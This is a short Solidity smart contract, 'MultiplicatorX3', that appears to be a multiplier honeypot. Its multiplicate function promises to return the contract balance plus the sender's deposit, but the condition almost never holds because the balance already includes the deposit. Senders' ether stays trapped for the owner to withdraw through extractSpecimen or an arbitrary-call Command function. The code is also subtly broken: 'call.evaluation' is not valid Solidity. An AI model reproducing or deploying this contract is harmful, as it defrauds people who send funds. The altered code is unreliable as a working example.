// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.sender;

    function() public payable{}

    function extractSpecimen()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes record)
    payable
    public
    {
        require(msg.sender == Owner);
        adr.call.evaluation(msg.value)(record);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {
            adr.transfer(this.balance+msg.value);
        }
    }
}